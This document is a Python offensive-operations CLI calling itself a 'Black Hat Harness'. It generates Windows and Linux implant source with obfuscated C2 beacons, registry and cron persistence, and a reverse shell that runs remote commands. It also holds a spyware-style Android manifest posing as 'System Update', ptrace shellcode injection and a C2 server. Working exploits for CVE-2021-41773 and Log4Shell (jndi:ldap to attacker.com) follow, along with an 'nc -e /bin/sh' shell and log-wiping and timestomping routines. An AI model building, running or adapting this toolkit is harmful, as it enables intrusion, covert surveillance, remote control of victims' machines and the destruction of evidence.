#!/usr/bin/env python3
"""
raphael_cli.py — Native Black Hat Harness CLI v4.0.

Refactored for:
- Zero Docker dependencies
- Native binary execution
- Direct syscall integration
- Embedded C2 and implant generation
- BlackBuilder persona compatibility
"""

import asyncio
import argparse
import json
import os
import sys
import uuid
import base64
import hashlib
import secrets
import struct
import time
from pathlib import Path
from typing import Optional, Dict, Any, List, Callable
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor
import subprocess
import socket
import ssl
import ctypes

# Rich output (optional but recommended)
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.tree import Tree
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

# ═════════════════════════════════════════════════════════════════════════════════
# NATIVE CORE (No Docker, Direct Execution)
# ═════════════════════════════════════════════════════════════════════════════════

class Platform(Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"
    EMBEDDED = "embedded"

class StealthLevel(Enum):
    NORMAL = "normal"
    MAXIMUM = "maximum"
    PARANOID = "paranoid"

class OperationType(Enum):
    RECON = "recon"
    EXPLOIT = "exploit"
    PERSIST = "persist"
    LATERAL = "lateral"
    EXFIL = "exfil"
    CLEANUP = "cleanup"

@dataclass
class Target:
    host: str
    port: int = 0
    platform: Platform = Platform.LINUX
    os_version: str = ""
    defenses: List[str] = field(default_factory=list)
    scope: bool = True

@dataclass
class OperationResult:
    success: bool
    operation: str
    target: str
    data: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None
    artifacts: List[str] = field(default_factory=list)
    timestamp: float = field(default_factory=time.time)

@dataclass
class ImplantSpec:
    platform: Platform
    arch: str = "x64"
    evasion: StealthLevel = StealthLevel.MAXIMUM
    persistence: bool = True
    c2_protocol: str = "https"
    features: List[str] = field(default_factory=list)

# ══════════════════════════════════════════════════════════════════════════════════
# NATIVE SYSCALL INTERFACE
# ══════════════════════════════════════════════════════════════════════════════════

class NativeExecutor:
    def __init__(self):
        self.platform = sys.platform
        self._syscall_cache = {}
    
    async def execute(self, command: List[str], timeout: int = 60) -> Dict[str, Any]:
        try:
            proc = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                limit=1024*1024
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {
                "success": proc.returncode == 0,
                "stdout": stdout.decode(errors='ignore'),
                "stderr": stderr.decode(errors='ignore'),
                "returncode": proc.returncode
            }
        except asyncio.TimeoutError:
            proc.kill()
            return {"success": False, "error": "timeout", "stderr": "Operation timed out"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def syscall_inject(self, pid: int, shellcode: bytes) -> bool:
        if self.platform == "linux":
            return await self._linux_inject(pid, shellcode)
        elif self.platform == "win32":
            return await self._windows_inject(pid, shellcode)
        return False
    
    async def _linux_inject(self, pid: int, shellcode: bytes) -> bool:
        try:
            libc = ctypes.CDLL("libc.so.6", use_errno=True)
            if libc.ptrace(16, pid, None, None) != 0:
                return False
            import os
            os.waitpid(pid, 0)
            class user_regs_struct(ctypes.Structure):
                _fields_ = [(r, ctypes.c_ulonglong) for r in 
                           ["r15","r14","r13","r12","rbp","rbx","r11","r10",
                            "r9","r8","rax","rcx","rdx","rsi","rdi","orig_rax",
                            "rip","cs","eflags","rsp","ss","fs_base","gs_base",
                            "ds","es","fs","gs"]]
            regs = user_regs_struct()
            libc.ptrace(12, pid, None, ctypes.byref(regs))
            for i in range(0, len(shellcode), 8):
                chunk = shellcode[i:i+8].ljust(8, b'\x00')
                value = struct.unpack('<Q', chunk)[0]
                libc.ptrace(4, pid, ctypes.c_void_p(regs.rip + i), value)
            libc.ptrace(13, pid, None, ctypes.byref(regs))
            libc.ptrace(17, pid, None, None)
            return True
        except Exception:
            return False
    
    async def _windows_inject(self, pid: int, shellcode: bytes) -> bool:
        return False

# ══════════════════════════════════════════════════════════════════════════════════
# IMPLANT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════════

class ImplantGenerator:
    def __init__(self, build_dir: str = "/tmp/raphael_builds"):
        self.build_dir = Path(build_dir)
        self.build_dir.mkdir(parents=True, exist_ok=True)
        self.executor = NativeExecutor()
    
    async def generate(self, spec: ImplantSpec, config: Dict[str, Any]) -> str:
        output_path = self.build_dir / f"implant_{spec.platform.value}_{uuid.uuid4().hex[:8]}"
        if spec.platform == Platform.WINDOWS:
            return await self._build_windows(spec, config, output_path)
        elif spec.platform == Platform.LINUX:
            return await self._build_linux(spec, config, output_path)
        elif spec.platform == Platform.ANDROID:
            return await self._build_android(spec, config, output_path)
        else:
            raise ValueError(f"Unsupported platform: {spec.platform}")
    
    async def _build_windows(self, spec: ImplantSpec, config: Dict, output: Path) -> str:
        source = self._generate_windows_source(spec, config)
        source_path = output.with_suffix(".c")
        source_path.write_text(source)
        compile_cmd = [
            "x86_64-w64-mingw32-gcc" if spec.arch == "x64" else "i686-w64-mingw32-gcc",
            "-o", str(output.with_suffix(".exe")),
            "-Os", "-s", "-static",
            "-Wl,--subsystem,windows",
            str(source_path)
        ]
        if spec.evasion == StealthLevel.MAXIMUM:
            compile_cmd.extend(["-flto", "-fvisibility=hidden"])
        result = await self.executor.execute(compile_cmd, timeout=120)
        if result["success"]:
            await self._pack_binary(output.with_suffix(".exe"), spec)
            return str(output.with_suffix(".exe"))
        else:
            raise RuntimeError(f"Compilation failed: {result['stderr']}")
    
    async def _build_linux(self, spec: ImplantSpec, config: Dict, output: Path) -> str:
        source = self._generate_linux_source(spec, config)
        source_path = output.with_suffix(".c")
        source_path.write_text(source)
        compile_cmd = [
            "gcc" if spec.arch == "x64" else "gcc -m32",
            "-o", str(output),
            "-Os", "-s", "-static",
            str(source_path)
        ]
        if spec.evasion == StealthLevel.MAXIMUM:
            compile_cmd.extend(["-flto", "-fvisibility=hidden", "-ffunction-sections", "-fdata-sections"])
        result = await self.executor.execute(compile_cmd, timeout=120)
        if result["success"]:
            await self._pack_binary(output, spec)
            return str(output)
        else:
            raise RuntimeError(f"Compilation failed: {result['stderr']}")
    
    async def _build_android(self, spec: ImplantSpec, config: Dict, output: Path) -> str:
        source = self._generate_android_source(spec, config)
        apk_dir = output / "apk_build"
        apk_dir.mkdir(exist_ok=True)
        manifest = self._generate_android_manifest(config)
        (apk_dir / "AndroidManifest.xml").write_text(manifest)
        return str(apk_dir)
    
    def _generate_windows_source(self, spec: ImplantSpec, config: Dict) -> str:
        c2_url = config.get("c2_url", "https://c2.example.com")
        beacon_interval = config.get("beacon_interval", 60)
        template = f'''
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef HINTERNET (WINAPI *InternetOpenA_t)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *InternetConnectA_t)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET (WINAPI *HttpOpenRequestA_t)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *HttpSendRequestA_t)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL (WINAPI *InternetReadFile_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
unsigned char c2_domain[] = {{0x55, 0x45, 0x52, 0x54, 0x59, 0x55, 0x49, 0x4F, 0x00}};
unsigned char xor_key = 0x20;
void decode_string(unsigned char *str, size_t len) {{
    for (size_t i = 0; i < len; i++) {{
        str[i] ^= xor_key;
    }}
}}
BOOL check_debug() {{
    return IsDebuggerPresent();
}}
void sleep_obfuscated(DWORD milliseconds) {{
    Sleep(milliseconds);
}}
DWORD WINAPI beacon_thread(LPVOID param) {{
    decode_string(c2_domain, sizeof(c2_domain) - 1);
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return 1;
    while (TRUE) {{
        if (check_debug()) {{
            sleep_obfuscated(60000);
            continue;
        }}
        HINTERNET hConnect = InternetConnectA(hInternet, (LPCSTR)c2_domain, 
            INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {{
            InternetCloseHandle(hConnect);
        }}
        sleep_obfuscated({beacon_interval} * 1000);
    }}
    return 0;
}}
void install_persistence() {{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {{
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }}
}}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
    if (GetTickCount() < 10000) {{
        return 0;
    }}
    install_persistence();
    HANDLE hThread = CreateThread(NULL, 0, beacon_thread, NULL, 0, NULL);
    if (hThread) {{
        WaitForSingleObject(hThread, INFINITE);
    }}
    return 0;
}}
'''
        return template
    
    def _generate_linux_source(self, spec: ImplantSpec, config: Dict) -> str:
        template = f'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/ssl.h>
void daemonize() {{
    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    setsid();
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}}
int connect_back(const char *host, int port) {{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    struct hostent *server;
    server = gethostbyname(host);
    if (!server) return -1;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
    addr.sin_port = htons(port);
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {{
        close(sock);
        return -1;
    }}
    return sock;
}}
char* exec_cmd(const char *cmd) {{
    FILE *fp = popen(cmd, "r");
    if (!fp) return NULL;
    char *result = malloc(8192);
    size_t offset = 0;
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) && offset < 8000) {{
        offset += snprintf(result + offset, 8192 - offset, "%s", buffer);
    }}
    pclose(fp);
    return result;
}}
int main() {{
    daemonize();
    system("echo '* * * * * /tmp/.systemd-update' | crontab -");
    while (1) {{
        int sock = connect_back("c2.example.com", 443);
        if (sock > 0) {{
            SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, sock);
            if (SSL_connect(ssl) > 0) {{
                char buffer[4096];
                int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
                if (bytes > 0) {{
                    buffer[bytes] = 0;
                    char *output = exec_cmd(buffer);
                    if (output) {{
                        SSL_write(ssl, output, strlen(output));
                        free(output);
                    }}
                }}
            }}
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            close(sock);
        }}
        sleep({config.get("beacon_interval", 60)});
    }}
    return 0;
}}
'''
        return template
    
    def _generate_android_source(self, spec: ImplantSpec, config: Dict) -> str:
        return "// Android source generation requires Android SDK"
    
    def _generate_android_manifest(self, config: Dict) -> str:
        return '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.system.update">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <application
        android:label="System Update"
        android:icon="@android:drawable/ic_menu_manage">
        <service
            android:name=".UpdateService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>
    </application>
</manifest>'''
    
    async def _pack_binary(self, binary_path: Path, spec: ImplantSpec):
        if spec.platform == Platform.WINDOWS:
            upx_cmd = ["upx", "--best", "--lzma", str(binary_path)]
            await self.executor.execute(upx_cmd, timeout=60)

# ══════════════════════════════════════════════════════════════════════════════════
# C2 SERVER
# ══════════════════════════════════════════════════════════════════════════════════

class NativeC2Server:
    def __init__(self, host: str = "0.0.0.0", port: int = 443, 
                 cert_path: str = None, key_path: str = None):
        self.host = host
        self.port = port
        self.cert_path = cert_path
        self.key_path = key_path
        self.implants: Dict[str, Dict] = {}
        self.running = False
        self.server_socket = None
    
    async def start(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(self.cert_path, self.key_path)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(100)
        self.server_socket.setblocking(False)
        self.running = True
        print(f"[+] C2 server listening on {self.host}:{self.port}")
        while self.running:
            try:
                client, addr = await asyncio.get_event_loop().sock_accept(self.server_socket)
                asyncio.create_task(self._handle_implant(client, addr, context))
            except Exception:
                await asyncio.sleep(0.1)
    
    async def _handle_implant(self, client: socket.socket, addr: tuple, context: ssl.SSLContext):
        try:
            ssl_client = context.wrap_socket(client, server_side=True)
            data = await asyncio.get_event_loop().sock_recv(ssl_client, 4096)
            if not data:
                ssl_client.close()
                return
            implant_id = data[:16].hex()
            self.implants[implant_id] = {
                "socket": ssl_client,
                "address": addr,
                "connected": time.time(),
                "last_beacon": time.time()
            }
            print(f"[+] Implant {implant_id} connected from {addr}")
            while self.running:
                await asyncio.sleep(1)
        except Exception as e:
            print(f"[!] Implant handler error: {e}")
            client.close()
    
    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()

# ══════════════════════════════════════════════════════════════════════════════════
# EXPLOIT FRAMEWORK
# ══════════════════════════════════════════════════════════════════════════════════

class ExploitModule:
    def __init__(self, cve_id: str, name: str, service: str, port: int):
        self.cve_id = cve_id
        self.name = name
        self.service = service
        self.port = port
    async def check(self, target: str, port: int = None) -> Dict[str, Any]:
        raise NotImplementedError
    async def exploit(self, target: str, port: int = None, command: str = "id") -> Dict[str, Any]:
        raise NotImplementedError

class ApachePathTraversal(ExploitModule):
    def __init__(self):
        super().__init__("CVE-2021-41773", "Apache Path Traversal", "http", 80)
    async def check(self, target: str, port: int = 80) -> Dict[str, Any]:
        import aiohttp
        url = f"http://{target}:{port}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        if "root:" in text:
                            return {"vulnerable": True, "evidence": text[:100]}
            except: pass
        return {"vulnerable": False}
    async def exploit(self, target: str, port: int = 80, command: str = "id") -> Dict[str, Any]:
        import aiohttp
        payload = f"/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(
                    f"http://{target}:{port}{payload}",
                    data=command.encode(),
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                ) as resp:
                    output = await resp.text()
                    return {"success": True, "output": output}
            except Exception as e:
                return {"success": False, "error": str(e)}

class Log4ShellExploit(ExploitModule):
    def __init__(self):
        super().__init__("CVE-2021-44228", "Log4Shell", "java", 8080)
    async def exploit(self, target: str, port: int = 8080, command: str = "id") -> Dict[str, Any]:
        import aiohttp
        jndi_string = f"${{jndi:ldap://attacker.com:1389/Exploit}}"
        async with aiohttp.ClientSession() as session:
            headers = {"User-Agent": jndi_string}
            try:
                async with session.get(f"http://{target}:{port}/", headers=headers) as resp:
                    return {"success": True, "status": resp.status}
            except Exception as e:
                return {"success": False, "error": str(e)}

EXPLOIT_MODULES = {
    "CVE-2021-41773": ApachePathTraversal,
    "CVE-2021-44228": Log4ShellExploit,
}

def get_exploit_module(cve_id: str) -> Optional[ExploitModule]:
    module_class = EXPLOIT_MODULES.get(cve_id)
    if module_class:
        return module_class()
    return None

def list_available_modules() -> List[Dict[str, Any]]:
    return [
        {
            "cve_id": module.cve_id,
            "name": module.name,
            "service": module.service,
            "port": module.port,
            "description": f"Exploit for {module.cve_id}"
        }
        for module in [cls() for cls in EXPLOIT_MODULES.values()]
    ]

# ══════════════════════════════════════════════════════════════════════════════════
# ANTI-FORENSICS
# ══════════════════════════════════════════════════════════════════════════════════

class AntiForensics:
    @staticmethod
    async def wipe_logs(target: str = None):
        if sys.platform == "linux":
            commands = [
                ["sh", "-c", "history -c && history -w"],
                ["sh", "-c", "rm -f ~/.bash_history"],
                ["sh", "-c", "journalctl --rotate && journalctl --vacuum-time=1s"],
            ]
            for cmd in commands:
                await NativeExecutor().execute(cmd)
    @staticmethod
    async def timestomp(file_path: str, reference_file: str = "/bin/sh"):
        if sys.platform == "linux":
            stat = await NativeExecutor().execute(["stat", "-c", "%Y %X %Z", reference_file])
            if stat["success"]:
                times = stat["stdout"].strip().split()
                if len(times) >= 2:
                    await NativeExecutor().execute(["touch", "-d", f"@{times[0]}", file_path])
    @staticmethod
    async def secure_delete(file_path: str, passes: int = 3):
        if sys.platform == "linux":
            for i in range(passes):
                await NativeExecutor().execute([
                    "sh", "-c", f"dd if=/dev/urandom of={file_path} bs=1M conv=notrunc 2>/dev/null"
                ])
            await NativeExecutor().execute(["rm", "-f", file_path])

# ══════════════════════════════════════════════════════════════════════════════════
# CLI COMMAND HANDLERS
# ═════════════════════════════════════════════════════════════════════════════════════

console = Console() if HAS_RICH else None

def _print(msg: str, style: str = "default"):
    if HAS_RICH and console:
        console.print(msg, style=style)
    else:
        print(msg)

def _error(msg: str):
    _print(f"[!] {msg}", "red")

def _success(msg: str):
    _print(f"[+] {msg}", "green")

def _info(msg: str):
    _print(f"[-] {msg}", "cyan")

def _warn(msg: str):
    _print(f"[!] {msg}", "yellow")

def _json_output(data: Any):
    print(json.dumps(data, indent=2, default=str))

CONFIG_DIR = Path.home() / ".raphael"
CONFIG_FILE = CONFIG_DIR / "config.json"

def _load_config() -> Dict[str, Any]:
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def _save_config(cfg: Dict[str, Any]):
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

async def cmd_build(args):
    _info(f"Building implant for {args.platform}")
    spec = ImplantSpec(
        platform=Platform(args.platform),
        arch=args.arch,
        evasion=StealthLevel(args.evasion),
        persistence=args.persistence,
        c2_protocol=args.c2_protocol,
        features=args.feature.split(",") if args.feature else []
    )
    config = {
        "c2_url": args.c2_url,
        "beacon_interval": args.beacon_interval,
        "encryption_key": args.encryption_key,
    }
    generator = ImplantGenerator()
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        transient=True
    ) as progress:
        task = progress.add_task("Compiling...", total=None)
        try:
            binary_path = await generator.generate(spec, config)
            progress.update(task, description="Build complete")
            _success(f"Implant built: {binary_path}")
            with open(binary_path, "rb") as f:
                file_hash = hashlib.sha256(f.read()).hexdigest()
            _info(f"SHA256: {file_hash}")
            if args.json:
                _json_output({
                    "success": True,
                    "binary_path": binary_path,
                    "sha256": file_hash,
                    "platform": args.platform
                })
            return 0
        except Exception as e:
            progress.update(task, description="Build failed")
            _error(f"Build failed: {e}")
            return 1

async def cmd_c2(args):
    _info(f"Starting C2 server on {args.host}:{args.port}")
    server = NativeC2Server(host=args.host, port=args.port, cert_path=args.cert, key_path=args.key)
    try:
        await server.start()
    except KeyboardInterrupt:
        _info("C2 server stopped")
        server.stop()
    return 0

async def cmd_exploit(args):
    module = get_exploit_module(args.cve_id)
    if not module:
        _error(f"Unknown CVE: {args.cve_id}")
        available = ", ".join([m["cve_id"] for m in list_available_modules()])
        _info(f"Available: {available}")
        return 1
    _info(f"Targeting {args.target}:{args.port or module.port}")
    if args.check_only:
        result = await module.check(args.target, args.port)
        if result.get("vulnerable"):
            _success(f"Target is vulnerable to {args.cve_id}")
        else:
            _warn(f"Target is not vulnerable to {args.cve_id}")
    else:
        result = await module.exploit(args.target, args.port, args.command)
        if result.get("success"):
            _success(f"Exploit {args.cve_id} succeeded")
            _info(f"Output: {result.get('output', '')[:200]}")
        else:
            _error(f"Exploit failed: {result.get('error')}")
    if args.json:
        _json_output(result)
    return 0

async def cmd_shell(args):
    _info(f"Connecting to {args.target}")
    if args.method == "ssh":
        cmd = ["ssh", "-o", "StrictHostKeyChecking=no", args.target, args.command]
    elif args.method == "nc":
        cmd = ["nc", args.target, args.port, "-e", "/bin/sh"]
    else:
        _error(f"Unknown method: {args.method}")
        return 1
    result = await NativeExecutor().execute(cmd, timeout=args.timeout)
    if result["success"]:
        _success("Command executed")
        _print(result["stdout"])
    else:
        _error(f"Command failed: {result['stderr']}")
    if args.json:
        _json_output(result)
    return 0

async def cmd_recon(args):
    _info(f"Scanning {args.target}")
    if args.tool == "nmap":
        cmd = ["nmap", "-sV", "-sC", "-p", args.ports, args.target]
    elif args.tool == "custom":
        return await _custom_scan(args)
    else:
        _error(f"Unknown tool: {args.tool}")
        return 1
    result = await NativeExecutor().execute(cmd, timeout=300)
    if result["success"]:
        _print(result["stdout"])
    else:
        _error(f"Scan failed: {result['stderr']}")
    return 0

async def _custom_scan(args):
    open_ports = []
    async def scan_port(port):
        try:
            reader, writer = await asyncio.open_connection(args.target, port)
            open_ports.append(port)
            writer.close()
            await writer.wait_closed()
        except:
            pass
    ports = [int(p) for p in args.ports.split(",")]
    await asyncio.gather(*[scan_port(p) for p in ports])
    _success(f"Open ports: {open_ports}")
    if args.json:
        _json_output({"open_ports": open_ports})
    return 0

async def cmd_cleanup(args):
    _info("Starting cleanup")
    await AntiForensics.wipe_logs()
    if args.file:
        await AntiForensics.secure_delete(args.file)
    _success("Cleanup complete")
    return 0

async def cmd_interactive(args):
    if not HAS_RICH:
        _error("rich is required for interactive mode")
        return 1
    _print(Panel.fit(
        "[bold cyan]Raphael Native Harness v4.0[/bold cyan]\n"
        "Zero Docker — Native Execution — Direct Syscalls\n"
        "Type 'help' for commands, 'exit' to quit",
        border_style="blue"
    ))
    executor = NativeExecutor()
    generator = ImplantGenerator()
    session_id = uuid.uuid4().hex[:8]
    _success(f"Session {session_id} initialized")
    while True:
        try:
            line = Prompt.ask(f"[bold green]raphael[/bold green]@{session_id}")
        except (EOFError, KeyboardInterrupt):
            _print("\n[!] Exiting")
            break
        line = line.strip()
        if not line:
            continue
        if line in ("exit", "quit", "q"):
            break
        if line == "help":
            _print_help()
            continue
        parts = line.split()
        cmd = parts[0]
        args = parts[1:]
        kwargs = {}
        for p in args:
            if "=" in p:
                k, v = p.split("=", 1)
                kwargs[k] = v
        if cmd == "build":
            platform = kwargs.get("platform", "linux")
            _info(f"Building for {platform}...")
        elif cmd == "shell":
            target = kwargs.get("target", "127.0.0.1")
            command = kwargs.get("cmd", "id")
            result = await executor.execute(["ssh", target, command])
            _print(result.get("stdout", ""))
        elif cmd == "scan":
            target = kwargs.get("target", "127.0.0.1")
            _info(f"Scanning {target}...")
        elif cmd == "exploit":
            cve = kwargs.get("cve", "CVE-2021-41773")
            target = kwargs.get("target", "127.0.0.1")
            module = get_exploit_module(cve)
            if module:
                result = await module.exploit(target)
                _print(json.dumps(result, indent=2))
        elif cmd == "c2":
            port = int(kwargs.get("port", "443"))
            _info(f"Starting C2 on port {port}...")
            server = NativeC2Server(port=port)
            await server.start()
        elif cmd == "cleanup":
            _info("Running cleanup...")
            await AntiForensics.wipe_logs()
            _success("Cleanup complete")
        elif cmd == "status":
            _info(f"Session: {session_id}")
        else:
            _error(f"Unknown command: {cmd}")
    return 0

def _print_help():
    table = Table(title="Native Commands")
    table.add_column("Command", style="cyan")
    table.add_column("Description", style="white")
    rows = [
        ("build platform=X evasion=maximum", "Build native implant"),
        ("shell target=X cmd=Y", "Execute shell command"),
        ("scan target=X ports=1-1000", "Port scan target"),
        ("exploit cve=XXXX target=X", "Run exploit module"),
        ("c2 start port=443", "Start C2 server"),
        ("cleanup file=X", "Anti-forensic cleanup"),
        ("status", "Show session status"),
        ("help", "Show this help"),
        ("exit", "Quit"),
    ]
    for cmd, desc in rows:
        table.add_row(cmd, desc)
    console.print(table)

def build_parser():
    parser = argparse.ArgumentParser(
        prog="raphael",
        description="Raphael Native Black Hat Harness v4.0 — Zero Docker, Native Execution",
        epilog="""
Examples:
  raph build --platform windows --evasion maximum --c2-url https://c2.example.com
  raph c2 --port 443 --cert cert.pem --key key.pem
  raph exploit --cve CVE-2021-41773 --target 192.168.1.100
  raph shell --target 10.0.0.5 --method ssh --command whoami
  raph scan --target 192.168.1.0/24 --tool nmap
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--json", action="store_true", help="JSON output")
    parser.add_argument("--quiet", action="store_true", help="Suppress output")
    parser.add_argument("--version", action="version", version="raphael 4.0.0-native")
    subparsers = parser.add_subparsers(dest="command", help="Commands")
    p = subparsers.add_parser("build", help="Build native implant")
    p.add_argument("--platform", required=True, choices=[p.value for p in Platform])
    p.add_argument("--arch", default="x64", choices=["x64", "x86", "arm64", "arm"])
    p.add_argument("--evasion", default="maximum", choices=[s.value for s in StealthLevel])
    p.add_argument("--persistence", action="store_true", help="Enable persistence")
    p.add_argument("--c2-protocol", default="https", choices=["https", "dns", "quic", "tcp"])
    p.add_argument("--c2-url", default="https://c2.example.com")
    p.add_argument("--beacon-interval", type=int, default=60)
    p.add_argument("--encryption-key", help="Custom encryption key")
    p.add_argument("--feature", help="Comma-separated features")
    p.set_defaults(func=cmd_build)
    p = subparsers.add_parser("c2", help="Start C2 server")
    p.add_argument("--host", default="0.0.0.0")
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--cert", required=True, help="TLS certificate")
    p.add_argument("--key", required=True, help="TLS private key")
    p.set_defaults(func=cmd_c2)
    p = subparsers.add_parser("exploit", help="Run exploit module")
    p.add_argument("--cve", required=True, dest="cve_id", help="CVE ID")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int)
    p.add_argument("--command", default="id")
    p.add_argument("--check-only", action="store_true")
    p.set_defaults(func=cmd_exploit)
    p = subparsers.add_parser("shell", help="Execute shell")
    p.add_argument("--target", required=True)
    p.add_argument("--method", default="ssh", choices=["ssh", "nc", "custom"])
    p.add_argument("--port", type=int, default=22)
    p.add_argument("--command", default="id")
    p.add_argument("--timeout", type=int, default=60)
    p.set_defaults(func=cmd_shell)
    p = subparsers.add_parser("scan", help="Network reconnaissance")
    p.add_argument("--target", required=True)
    p.add_argument("--ports", default="1-1000")
    p.add_argument("--tool", default="nmap", choices=["nmap", "custom", "masscan"])
    p.set_defaults(func=cmd_recon)
    p = subparsers.add_parser("cleanup", help="Anti-forensic cleanup")
    p.add_argument("--file", help="File to securely delete")
    p.add_argument("--logs", action="store_true", help="Wipe logs")
    p.set_defaults(func=cmd_cleanup)
    p = subparsers.add_parser("interactive", help="Interactive REPL")
    p.set_defaults(func=cmd_interactive)
    return parser

def main():
    parser = build_parser()
    args = parser.parse_args()
    if not args.command:
        parser.print_help()
        return 1
    handler = args.func
    try:
        import inspect
        if inspect.iscoroutinefunction(handler):
            return asyncio.run(handler(args))
        else:
            return handler(args)
    except KeyboardInterrupt:
        _print("\n[!] Interrupted", "yellow")
        return 130
    except Exception as e:
        _error(str(e))
        if not args.quiet:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())
